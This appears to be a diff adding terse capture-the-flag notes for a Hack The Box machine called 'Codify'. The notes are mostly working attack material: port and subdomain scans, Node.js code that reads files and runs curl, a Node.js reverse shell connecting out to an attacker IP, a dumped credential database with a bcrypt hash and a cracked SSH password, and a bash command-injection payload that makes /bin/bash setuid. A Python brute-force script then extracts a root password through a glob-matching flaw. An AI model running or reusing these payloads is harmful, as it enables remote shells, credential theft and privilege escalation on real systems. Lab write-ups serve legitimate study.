@@ -1,0 +1,197 @@
+
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+└─$ nmap -sCV -Pn -p- --open 10.10.11.239 -o codify.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-18 12:51 +07
+Nmap scan report for 10.10.11.239
+Host is up (0.089s latency).
+Not shown: 57940 closed tcp ports (conn-refused), 7592 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
+|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://codify.htb/
+3000/tcp open  http    Node.js Express framework
+|_http-title: Codify
+Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 115.56 seconds
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.codify.htb" --hc 403,400,301 -t 50 10.10.11.239
+
+
+const fs = require('node:fs');
+try {
+  const data = fs.readFileSync('/etc/hosts', 'utf8');
+  console.log(data);
+} catch (err) {
+  console.error(err);
+}
+
+
+127.0.0.1 localhost
+127.0.1.1 codify codify.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+const { exec } = require('node:child_process');
+exec('curl 10.10.16.72', (err, stdout, stderr) => {
+  if (err) {
+    // node couldn't execute the command
+    return;
+  }
+
+  // the *entire* stdout and stderr (buffered)
+  console.log(`stdout: ${stdout}`);
+  console.log(`stderr: ${stderr}`);
+});
+
+(function(){
+    var net = require("node:net"),
+        cp = require("node:child_process"),
+        sh = cp.spawn("/bin/bash", []);
+    var client = new net.Socket();
+    client.connect(443, "10.10.16.72", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+
+svc@codify:/var/www/contact$ cat tickets.db 
+�T5��T�format 3@  .WJ
+       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��     tableusersusersCREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, 
+        username TEXT UNIQUE, 
+        password TEXT
+��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+��
+����ua  users
+             ickets
+r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. 
+
+joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+ssh joshua@10.10.11.239
+spongebob1
+
+joshua@codify:~$ sudo -l
+[sudo] password for joshua: 
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+
+
+
+joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo 
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+
+
+a[$(chmod 7755 /bin/bash >&2)]+test
+
+
+kljh12k3jhaskjh12kjh3
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+import subprocess
+import string
+import time
+
+password = ""
+while True:
+
+    # for char in string.printable:
+    for char in string.ascii_letters+string.digits:
+        # if char not in string.ascii_letters+string.digits:
+        #     char = chr(92)+char
+        stdin = password + char + "*"
+        result = subprocess.run(['./compare1.sh'], stdout=subprocess.PIPE, input=stdin.encode('utf-8'))
+        stdout = result.stdout.decode('utf-8')
+        if "Password confirmed!" in stdout:
+            password += char
+            print("password: "+password)
+            break
+# password = ""
+# while True:
+#     # for char in string.printable:
+#     #     password += char + "*"
+#     password = "test"
+#     cmd = subprocess.run(['./compare1.sh'], stdout=subprocess.PIPE, input=password.encode('utf-8'))
+#     result = cmd.stdout.decode('utf-8')
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------
